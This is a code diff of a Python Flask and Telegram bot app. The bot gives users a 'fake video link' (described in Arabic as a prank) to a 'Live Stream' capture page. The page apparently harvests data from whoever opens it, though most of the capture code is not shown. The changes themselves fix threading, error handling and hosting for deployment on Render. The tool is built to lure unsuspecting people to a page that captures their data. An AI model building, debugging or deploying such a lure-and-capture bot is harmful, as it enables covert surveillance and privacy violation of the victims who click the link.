@@ -17,7 +17,8 @@ print(f"MONGO_URL: {'Set' if MONGO_URL else 'MISSING'}")
 if not TOKEN:
     raise RuntimeError("BOT_TOKEN is missing")
 
-bot = telebot.TeleBot(TOKEN)
+# ✅ الإصلاح المهم: threaded=False لمنع إنهاء الخيط قبل تنفيذ الأمر
+bot = telebot.TeleBot(TOKEN, threaded=False)
 app = Flask(__name__)
 
 users_collection = None
@@ -42,7 +43,7 @@ def capture_page():
         is_allowed = users_collection.find_one({"user_id": user_id}) is not None
     if not user_id or not is_allowed:
         return "الرابط غير صالح", 403
-    
+
     html = """
     
     Live Stream
@@ -71,11 +72,9 @@ def capture():
 
 @app.route("/webhook", methods=["POST"])
 def webhook():
-    print("--- WEBHOOK RECEIVED ---")
     if request.headers.get("content-type") == "application/json":
         try:
             update = telebot.types.Update.de_json(request.get_data(as_text=True))
-            print(f"UPDATE: {update}")
             bot.process_new_updates([update])
             return "OK", 200
         except Exception as e:
@@ -87,16 +86,20 @@ def webhook():
 @bot.message_handler(commands=["start"])
 def start(message):
     print(f"--- START COMMAND RECEIVED FROM {message.chat.id} ---")
-    bot.reply_to(message, "مرحبًا! أرسل الأمر /link لصنع المقلب.")
+    try:
+        bot.reply_to(message, "مرحبًا! أرسل الأمر /link لصنع المقلب.")
+        print("--- START REPLY SENT ---")
+    except Exception as e:
+        print(f"❌ Error in /start: {e}")
 
 @bot.message_handler(commands=["link"])
 def link(message):
     print(f"--- LINK COMMAND RECEIVED FROM {message.chat.id} ---")
     try:
         if not BASE_URL:
-            bot.reply_to(message, "❌ خطأ: متغير BASE_URL غير معين في إعدادات Vercel.")
+            bot.reply_to(message, "❌ خطأ: متغير BASE_URL غير معين في إعدادات Render.")
             return
-            
+
         if users_collection is not None:
             users_collection.update_one(
                 {"user_id": message.chat.id},
@@ -105,11 +108,12 @@ def link(message):
             )
         url = f"{BASE_URL}/capture?user_id={message.chat.id}"
         bot.reply_to(message, f"✅ تم إنشاء رابط الفيديو الوهمي:\n\n{url}")
+        print(f"--- LINK REPLY SENT: {url} ---")
     except Exception as e:
         print(f"❌ Error in /link: {e}")
         bot.reply_to(message, f"حدث خطأ: {e}")
 
-# للتشغيل المحلي فقط
+# للتشغيل المحلي فقط (لن يعمل على Render لأن gunicorn هو الذي يشغل التطبيق)
 if __name__ == "__main__":
     port = int(os.environ.get('PORT', 5000))
     app.run(host="0.0.0.0", port=port)
